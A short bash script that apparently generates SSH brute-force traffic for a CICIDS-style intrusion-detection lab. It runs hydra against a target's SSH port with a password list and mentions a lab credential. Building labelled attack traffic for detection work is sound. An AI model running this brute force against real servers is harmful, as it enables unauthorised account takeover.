#!/usr/bin/env bash
# CICIDS SSH-Patator (brute force). hydra opens many short completed TCP sessions to
# sshd, each a >=2 packet flow. labuser/labpass is a real credential on the fleet ssh
# box so the run also exercises a success path. No em dashes.
set -euo pipefail
TARGET=""; USER_NAME="${USER_NAME:-labuser}"
while [ $# -gt 0 ]; do case "$1" in
  --target) TARGET="${2:?}"; shift 2;;
  --user) USER_NAME="${2:?}"; shift 2;;
  *) shift;; esac; done
[ -n "$TARGET" ] || { echo "usage: $0 --target <ip> [--user name]" >&2; exit 2; }

echo "TOOL hydra -l ${USER_NAME} -P /attacks/passwords.txt -t 4 ssh://${TARGET}:22"
echo "START_EPOCH $(date +%s)"
# -t 4 parallel tasks, -f stop on first valid, -I ignore restore file, -V verbose.
hydra -l "$USER_NAME" -P /attacks/passwords.txt -t 4 -f -I -V "ssh://${TARGET}:22" || true
echo "END_EPOCH $(date +%s)"
